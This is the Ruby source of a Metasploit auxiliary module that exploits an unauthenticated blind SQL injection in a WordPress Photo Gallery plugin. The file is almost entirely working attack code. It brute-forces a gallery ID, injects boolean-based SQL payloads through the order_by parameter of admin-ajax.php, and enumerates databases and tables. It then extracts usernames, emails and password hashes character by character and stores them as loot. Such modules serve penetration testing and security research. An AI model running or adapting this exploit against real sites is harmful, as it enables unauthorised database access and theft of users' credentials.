##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'
require 'json'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Wordpress Photo Gallery Unauthenticated SQL Injection User Enumeration",
      'Description'    => %q{This module enumerates usernames and password hashes from the vulnerable instance.

      This module exploits an unauthenticated SQL injection in order to enumerate the Wordpress
      users tables, including password hashes. This module was tested against version 1.2.7.

      Categories: Wordpress, SQL Injection

      Price: 2

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry'
        ],
      'References'     =>
        [
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Jan 12 2015"))

      register_options(
      [
        OptInt.new('TIMEOUT', [true, 'The HTTP timeout to use', 200]),
        OptInt.new('RETRIES', [true, 'Number of attempts to make of a failed request', 5]),
        OptInt.new('GALLERYID', [false, 'Gallery ID to use. If not provided, the module will attempt to bruteforce one.', nil]),
        OptString.new('TARGETURI', [ true, 'Relative URI of Wordpress installation', '/'])
      ], self.class)
  end

  def timeout
    datastore['TIMEOUT']
  end

  def get_params
    {
      'tag_id' => 0,
      'action' => 'GalleryBox',
      'current_view' => 0,
      'image_id' => 1,
      'gallery_id' => 1,
      'theme_id' => 1,
      'thumb_width' => 180,
      'thumb_height' => 90,
      'open_with_fullscreen' => 0,
      'open_with_autoplay' => 0,
      'image_width' => 800,
      'image_height' => 500,
      'image_effect' => 'fade',
      'sort_by' => 'order',
      'order_by' => 'asc',
      'enable_image_filmstrip' => 1,
      'image_filmstrip_height' => 70,
      'enable_image_ctrl_btn' => 1,
      'enable_image_fullscreen' => 1,
      'popup_enable_info' => 1,
      'popup_info_always_show' => 0,
      'popup_info_full_width' => 0,
      'popup_hit_counter' => 0,
      'popup_enable_rate' => 0,
      'slideshow_interval' => 5,
      'enable_comment_social' => 1,
      'enable_image_facebook' => 1,
      'enable_image_twitter' => 1,
      'enable_image_google' => 1,
      'enable_image_pinterest' => 0,
      'enable_image_tumblr' => 0,
      'watermark_type' => 'none',
      'current_url' => ''
    }
  end

  def bruteforce_gallery_id
    1.upto(666) do |i|
      get_vars = get_params
      get_vars['gallery_id'] = i
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => get_vars
      })

      return i if res and res.body =~ /data\["0"\] = \[\];/
    end

    fail_with(Failure::Unknown, "Couldn't bruteforce a gallery ID, please explicitly supply a known good gallery ID")
  end

  def run
    gallery_id = datastore['GALLERYID']

    if gallery_id == 0
      print_status('No GALLERYID supplied, attempting bruteforce.')
      gallery_id = bruteforce_gallery_id
      print_status("Found a gallery with an ID of #{gallery_id}")
    end

    parms = get_params
    parms['gallery_id'] = gallery_id

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => parms
    })

    real_length = res.body.length

    count = nil
    1.upto(999) do |i|
      payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(COUNT(DISTINCT(schema_name)),0x20) FROM INFORMATION_SCHEMA.SCHEMATA) BETWEEN 0 AND #{i}) THEN 0x2061736320 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

      res = send_injected_request(payload, gallery_id)

      count = i if res.body.length == real_length
      break if count
    end

    print_status("Looks like there are #{count} databases.")

    schemas = []
    0.upto(count-1) do |i|
      length = nil

      1.upto(999) do |c|
        payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(CHAR_LENGTH(schema_name),0x20) FROM (SELECT DISTINCT(schema_name) "
        payload << "FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1) AS pxqq) BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 6586*"
        payload << "(SELECT 6586 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

        res = send_injected_request(payload, gallery_id)

        length = c if res.body.length == real_length
        break if !length.nil?
      end

      print_status("Schema #{i}'s name has a length of #{length}. Getting name.")

      name = ''
      1.upto(length) do |l|
        126.downto(32) do |c|
          payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(schema_name AS CHAR),0x20) FROM (SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1) AS lela),#{l},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 7601*(SELECT 7601 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

          res = send_injected_request(payload, gallery_id)

          vprint_status("Found char #{(c+1).chr}") if res.body.length == real_length
          name << (c+1).chr if res.body.length == real_length
          break if res.body.length == real_length
        end
      end
      schemas << name
      print_status("Found database #{name}")
    end

    schemas.delete('mysql')
    schemas.delete('performance_schema')
    schemas.delete('information_schema')

    schemas.each do |schema|
      num_tables = nil
      1.upto(999) do |i|
        payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(COUNT(table_name),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{schema.unpack("H*")[0]}) BETWEEN 0 AND #{i}) THEN 0x2061736320 ELSE 8846*(SELECT 8846 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

        res = send_injected_request(payload, gallery_id)

        num_tables = i if res.body.length == real_length
        break if num_tables
      end

      print_status("Schema #{schema} has #{num_tables} tables. Enumerating.")

      tables = []
      0.upto(num_tables - 1) do |t|
        length = nil
        0.upto(64) do |l|
          payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(CHAR_LENGTH(table_name),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{schema.unpack("H*")[0]} LIMIT #{t},1) BETWEEN 0 AND #{l}) THEN 0x2061736320 ELSE 5819*(SELECT 5819 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

          res = send_injected_request(payload, gallery_id)

          length = l if res.body.length == real_length
          break if length
        end

        print_status("Table #{t}'s name has a length of #{length}")

        name = ''
        1.upto(length) do |l|
          126.downto(32) do |c|
            payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{schema.unpack("H*")[0]} LIMIT #{t},1),#{l},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 5819*(SELECT 5819 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

            res = send_injected_request(payload, gallery_id)

            name << (c+1).chr if res.body.length == real_length
            vprint_status("Found char #{(c+1).chr}") if res.body.length == real_length
            break if res.body.length == real_length
          end
        end
        print_status("Found table #{name}")
        tables << name if name =~ /users$/
      end

      print_status("Found #{tables.length} possible user tables. Enumerating users.")

      tables.each do |table|
        table_count = ''
        char = 'a'

        i = 1
        while char
          char = nil
          58.downto(48) do |c|
            payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{schema}.#{table}),#{i},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 8335*(SELECT 8335 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

            res = send_injected_request(payload, gallery_id)

            char = (c+1).chr if res.body.length == real_length
            vprint_status("Found char #{char}") if char
            table_count << char if char
            break if char
          end
          i = i + 1
        end

        table_count = table_count.to_i

        print_status("Table #{table} has #{table_count} rows.")
        user_cols = ["ID", "user_url", "user_pass", "user_login", "user_email", "user_status", "display_name", "user_nicename", "user_registered", "user_activation_key"]

        rows = []
        0.upto(table_count-1) do |t|
          row = {}
          user_cols.each do |col|
            i = 1
            length = '0'
            char = 'a'

            while char
              char = nil
              58.downto(48) do |c|
                payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(#{col}) AS CHAR),0x20) FROM #{schema}.#{table} ORDER BY ID LIMIT #{t},1),#{i},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 7837*(SELECT 7837 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

                res = send_injected_request(payload, gallery_id)

                char = (c+1).chr if res.body.length == real_length
                vprint_status("Found char #{char}") if char
                length << char if char
                break if char
              end
              i = i + 1
            end

            length = length.to_i
            print_status("Column #{col} of row #{t} has a length of #{length}")

            value = ''
            1.upto(length) do |l|
              char = nil
              126.downto(32) do |c|
                payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(#{col} AS CHAR),0x20) FROM #{schema}.#{table} ORDER BY ID LIMIT #{t},1),#{l},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 7837*(SELECT 7837 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

                res = send_injected_request(payload, gallery_id)

                char = (c+1).chr if res.body.length == real_length
                vprint_status("Found char #{char}") if char
                value << char if res.body.length == real_length
                break if res.body.length == real_length
              end
            end

            print_status("Found value #{value} for column #{col}, row #{t}")
            row[col] = value
          end
          rows << row
        end
        path = store_loot("wordpress.file", "application/json", datastore['RHOST'], rows.to_json, 'wp_photogallery.users')
        print_good("Users stored in JSON file #{path}")
      end
    end
  end

  def send_injected_request(payload, gallery_id)
    parms = get_params
    parms['gallery_id'] = gallery_id
    parms['order_by'] = 'asc ' + payload

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => parms
    }, timeout)

    i = 0
    while !res and i < datastore['RETRIES']
      i = i + 1
      print_error("Request failed, retrying #{datastore['RETRIES']-i} more times.")
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => parms
      }, timeout)
    end

    unless res
      fail_with(Failure::Unknown, 'Could not contact server')
    end

    return res
  end

end

